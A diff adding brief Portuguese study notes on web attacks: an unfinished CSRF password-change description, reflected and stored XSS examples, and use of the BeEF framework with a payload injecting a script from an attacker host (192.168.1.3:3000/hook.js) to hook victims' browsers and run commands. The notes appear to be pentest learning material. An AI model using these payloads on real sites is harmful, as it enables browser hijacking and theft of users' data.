@@ -1,0 +1,35 @@
+Falsificação de requisição entre sites
+
+Identificar essa vulnerabilidade:
+-Na URL de uma pagina de troca de senha de login (que não exige senha anterior) os campos password irão msotrar a senha em modo texto
+-Abrir codig fonte da pagina
+-Verificar o formulario de troca de senhas e jogar para o bloco de notas
+-Alterar no arquivo TXT os dados solicitados e 
+
+XSS 
+Ha dois tipos de XSS:
+XSS Stored
+XSS Reflected
+
+XSS Reflected
+Executa scripts atraves do browser do usuario.
+-EX: Na caixa de texto: <script>alert("teste")</script>
+
+XSS Stored
+Armazena um script em uma pagina de comentarios por exemplo (Pagina que permite enviar menssagem)
+-Adicionar no campo menssagem um script, EX: <script>alert("Ola")</script>
+
+Para fazer o Exploit e identificação de pagina com vulnerabilidade XSS:
+
+beef.xss
+
+Para iniciar, usar o comando "beef.xss" e usar a URL disponibilizada (127.0.0.1:3000/ui/autentication
+
+User e senha: beef
+
+Na URL da pagina a ser executado o XSS, trocar o valor apos o "name=", ou da variavel de submit, para o valor:
+name=<script src=http://192.168.1.3:3000/hook.js>
+
+O valor acima, faz com que tenhamos acesso a informações do browser pelo painel do beef.
+
+Com acesso ao browser da vitima, no beef ha opção de fazer diversos ataques e execução de comandos, alem de verificar versões e identificar logs do usuario.
